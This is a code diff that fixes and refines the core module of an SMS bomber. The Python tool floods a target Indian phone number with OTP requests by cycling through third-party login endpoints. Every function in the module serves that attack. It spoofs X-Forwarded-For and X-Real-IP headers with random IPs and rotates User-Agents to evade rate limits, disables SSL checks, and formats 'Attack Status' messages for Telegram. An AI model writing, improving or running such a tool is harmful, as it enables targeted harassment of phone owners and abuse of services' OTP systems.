@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-SMS Bomber Core Module - Production Grade
+SMS Bomber Core Module - FIXED
 Async implementation with proper error handling and rate limiting
 """
 
@@ -20,7 +20,7 @@ logger = logging.getLogger(__name__)
 
 @dataclass
 class AttackStats:
-    """Immutable attack statistics"""
+    """Attack statistics tracker"""
     total: int = 0
     success: int = 0
     failed: int = 0
@@ -28,48 +28,48 @@ class AttackStats:
     end_time: Optional[float] = None
     current_endpoint: str = ""
     errors: List[str] = field(default_factory=list)
-    
+
     @property
     def duration(self) -> float:
         if not self.start_time:
             return 0.0
         end = self.end_time or time.time()
         return end - self.start_time
-    
+
     @property
     def rate(self) -> float:
         if self.duration == 0:
             return 0.0
         return self.total / self.duration
-    
+
     @property
     def progress_pct(self) -> float:
-        return 0.0  # Set by bomber
+        return 0.0
 
 
 class RateLimiter:
     """Token bucket rate limiter"""
-    
+
     def __init__(self, rate: float, burst: int):
         self.rate = rate
         self.burst = burst
-        self.tokens = burst
+        self.tokens = float(burst)
         self.last_update = time.time()
         self._lock = asyncio.Lock()
-    
+
     async def acquire(self):
         async with self._lock:
             now = time.time()
             elapsed = now - self.last_update
-            self.tokens = min(self.burst, self.tokens + elapsed * self.rate)
+            self.tokens = min(float(self.burst), self.tokens + elapsed * self.rate)
             self.last_update = now
-            
+
             if self.tokens < 1:
                 wait_time = (1 - self.tokens) / self.rate
                 await asyncio.sleep(wait_time)
-                self.tokens = 0
+                self.tokens = 0.0
             else:
-                self.tokens -= 1
+                self.tokens -= 1.0
 
 
 class SMSBomber:
@@ -80,23 +80,23 @@ class SMSBomber:
     - Rate limiting
     - Comprehensive error handling
     """
-    
+
     def __init__(
-        self, 
-        phone_number: str, 
+        self,
+        phone_number: str,
         count: int,
         progress_callback: Optional[Callable[[AttackStats], Any]] = None
     ):
         self.phone = self._normalize_phone(phone_number)
         self.count = min(count, rate_limits.MAX_ATTEMPTS_PER_USER)
         self.progress_callback = progress_callback
-        
+
         self.stats = AttackStats()
         self._stop_event = asyncio.Event()
         self._lock = asyncio.Lock()
-        self._rate_limiter = RateLimiter(rate=2.0, burst=5)  # 2 req/s sustained
+        self._rate_limiter = RateLimiter(rate=2.0, burst=5)
         self._session: Optional[aiohttp.ClientSession] = None
-        
+
     def _normalize_phone(self, phone: str) -> str:
         """Normalize to +91XXXXXXXXXX format"""
         digits = ''.join(filter(str.isdigit, phone))
@@ -104,16 +104,18 @@ class SMSBomber:
             return f"+91{digits}"
         elif len(digits) == 12 and digits.startswith("91"):
             return f"+{digits}"
+        elif len(digits) == 13 and digits.startswith("091"):
+            return f"+{digits[1:]}"
         return phone
-    
+
     def _format_payload(self, endpoint: OTPEndpoint) -> Dict[str, Any]:
         """Format payload with phone number"""
         phone_clean = self.phone.replace("+", "")
         phone_10 = phone_clean[-10:]
-        
+
         if not endpoint.payload_template:
             return {endpoint.phone_param: self.phone}
-        
+
         payload = {}
         for key, value in endpoint.payload_template.items():
             if isinstance(value, str):
@@ -122,38 +124,47 @@ class SMSBomber:
                 value = value.replace("{phone_10}", phone_10)
             payload[key] = value
         return payload
-    
+
     def _get_headers(self, endpoint: OTPEndpoint) -> Dict[str, str]:
-        """Generate request headers"""
+        """Generate request headers with random User-Agent"""
         headers = DEFAULT_HEADERS.copy()
         headers["User-Agent"] = random.choice(USER_AGENTS)
-        
-        # Add random forwarded IP for privacy
-        ip = f"{random.randint(10, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
+
+        # Random forwarded IP
+        ip = (
+            f"{random.randint(10, 255)}.{random.randint(0, 255)}"
+            f".{random.randint(0, 255)}.{random.randint(1, 254)}"
+        )
         headers["X-Forwarded-For"] = ip
         headers["X-Real-IP"] = ip
-        
+
         if endpoint.headers:
             headers.update(endpoint.headers)
-        
+
         return headers
-    
+
     async def _send_otp(self, endpoint: OTPEndpoint) -> bool:
-        """Send single OTP request"""
+        """Send single OTP request to one endpoint"""
         if self._stop_event.is_set():
             return False
-        
+
+        # Check session is available
+        if self._session is None or self._session.closed:
+            logger.warning("Session not available, skipping request")
+            return False
+
         await self._rate_limiter.acquire()
-        
+
         async with self._lock:
             self.stats.current_endpoint = endpoint.name
-        
+
         payload = self._format_payload(endpoint)
         headers = self._get_headers(endpoint)
-        
+
         try:
             timeout = aiohttp.ClientTimeout(total=endpoint.timeout)
-            
+            is_json = headers.get("Content-Type") == "application/json"
+
             if endpoint.method.upper() == "GET":
                 async with self._session.get(
                     endpoint.url,
@@ -166,28 +177,29 @@ class SMSBomber:
             else:
                 async with self._session.post(
                     endpoint.url,
-                    json=payload if headers.get("Content-Type") == "application/json" else None,
-                    data=payload if headers.get("Content-Type") != "application/json" else None,
+                    json=payload if is_json else None,
+                    data=payload if not is_json else None,
                     headers=headers,
                     timeout=timeout,
                     ssl=False
                 ) as response:
                     success = response.status in (200, 201, 202, 204)
-            
+
             async with self._lock:
                 self.stats.total += 1
                 if success:
                     self.stats.success += 1
                 else:
                     self.stats.failed += 1
-            
+
             return success
-            
+
         except asyncio.TimeoutError:
             async with self._lock:
                 self.stats.total += 1
                 self.stats.failed += 1
             return False
+
         except aiohttp.ClientError as e:
             async with self._lock:
                 self.stats.total += 1
@@ -195,85 +207,99 @@ class SMSBomber:
                 if len(self.stats.errors) < 10:
                     self.stats.errors.append(f"{endpoint.name}: {str(e)[:50]}")
             return False
+
         except Exception as e:
             async with self._lock:
                 self.stats.total += 1
                 self.stats.failed += 1
-            logger.error(f"Unexpected error: {e}")
+            logger.error(f"Unexpected error for {endpoint.name}: {e}")
             return False
-    
+
     async def _progress_updater(self):
-        """Background task to send progress updates"""
+        """Background task to send progress updates every 2 seconds"""
         while not self._stop_event.is_set():
             if self.progress_callback:
                 try:
-                    await self.progress_callback(self.stats)
+                    # Support both sync and async callbacks
+                    result = self.progress_callback(self.stats)
+                    if asyncio.iscoroutine(result):
+                        await result
                 except Exception as e:
                     logger.error(f"Progress callback error: {e}")
             await asyncio.sleep(2)
-    
+
     async def start(self) -> AttackStats:
-        """Start the attack"""
+        """Start the SMS bombing attack"""
+        if not TARGET_ENDPOINTS:
+            logger.error("No endpoints configured!")
+            self.stats.start_time = time.time()
+            self.stats.end_time = time.time()
+            return self.stats
+
         self.stats.start_time = time.time()
-        
+        self._stop_event.clear()
+
         connector = aiohttp.TCPConnector(
             limit=50,
             limit_per_host=5,
             ttl_dns_cache=300,
             use_dns_cache=True,
         )
-        
+
         timeout = aiohttp.ClientTimeout(total=30)
-        
+
         async with aiohttp.ClientSession(
             connector=connector,
             timeout=timeout
         ) as self._session:
-            # Start progress updater
+            # Start progress updater in background
             progress_task = asyncio.create_task(self._progress_updater())
-            
-            # Create tasks for each OTP
+
             tasks = []
             endpoints = list(TARGET_ENDPOINTS)
-            
+
             for i in range(self.count):
                 if self._stop_event.is_set():
                     break
-                
+
                 endpoint = endpoints[i % len(endpoints)]
                 task = asyncio.create_task(self._send_otp(endpoint))
                 tasks.append(task)
-                
-                # Small stagger to prevent thundering herd
-                if i % 10 == 0:
+
+                # Stagger requests to avoid thundering herd
+                if i % 10 == 0 and i > 0:
                     await asyncio.sleep(0.1)
-            
-            # Wait for all tasks
-            await asyncio.gather(*tasks, return_exceptions=True)
-            
+
+            # Wait for all OTP tasks to complete
+            if tasks:
+                await asyncio.gather(*tasks, return_exceptions=True)
+
             # Stop progress updater
             self._stop_event.set()
-            await progress_task
-        
+            try:
+                await asyncio.wait_for(progress_task, timeout=3.0)
+            except asyncio.TimeoutError:
+                progress_task.cancel()
+
         self.stats.end_time = time.time()
         return self.stats
-    
+
     async def stop(self):
         """Stop the attack gracefully"""
         self._stop_event.set()
-    
+
     def get_progress_bar(self, width: int = 20) -> str:
         """Generate ASCII progress bar"""
         if self.count == 0:
             return "[░░░░░░░░░░░░░░░░░░░░] 0%"
-        
-        pct = min(100, (self.stats.total / self.count) * 100)
+
+        pct = min(100.0, (self.stats.total / self.count) * 100)
         filled = int(width * pct / 100)
         bar = "█" * filled + "░" * (width - filled)
         return f"[{bar}] {pct:.1f}%"
-    
+
     def format_status(self) -> str:
-        """Format current status for display"""
+        """Format current status for Telegram message display"""
         return f"""
 📊 **Attack Status**
 
@@ -285,29 +311,42 @@ class SMSBomber:
 ❌ Failed: {self.stats.failed}
 ⚡ Rate: {self.stats.rate:.1f} req/s
 ⏱️ Duration: {self.stats.duration:.1f}s
-🌐 Current: {self.stats.current_endpoint}
+🌐 Current: {self.stats.current_endpoint or 'Starting...'}
 """
 
 
-def validate_phone(phone: str) -> tuple[bool, str]:
-    """Validate phone number format"""
-    digits = ''.join(filter(str.isdigit, phone))
-    
+def validate_phone(phone: str) -> tuple:
+    """Validate and normalize Indian phone number"""
+    if not phone or not phone.strip():
+        return False, "Phone number cannot be empty"
+
+    digits = ''.join(filter(str.isdigit, phone.strip()))
+
     if len(digits) == 10:
+        # Must start with 6-9 for Indian mobile numbers
+        if digits[0] not in "6789":
+            return False, "Invalid Indian mobile number (must start with 6, 7, 8, or 9)"
         return True, f"+91{digits}"
+
     elif len(digits) == 12 and digits.startswith("91"):
+        if digits[2] not in "6789":
+            return False, "Invalid Indian mobile number"
         return True, f"+{digits}"
-    elif len(digits) == 13 and digits.startswith("91"):
-        return True, f"+{digits}"
-    
+
+    elif len(digits) == 13 and digits.startswith("091"):
+        if digits[3] not in "6789":
+            return False, "Invalid Indian mobile number"
+        return True, f"+{digits[1:]}"
+
     return False, "Invalid format. Use: +91XXXXXXXXXX or 10-digit Indian number"
 
 
-# Test
+# Quick test
 if __name__ == "__main__":
     async def test():
-        bomber = SMSBomber("+919999999999", 5)
+        print("Testing SMS Bomber...")
+        bomber = SMSBomber("+919999999999", 3)
         stats = await bomber.start()
-        print(f"Test complete: {stats}")
-    
+        print(f"Test complete: total={stats.total}, success={stats.success}, failed={stats.failed}")
+
     asyncio.run(test())
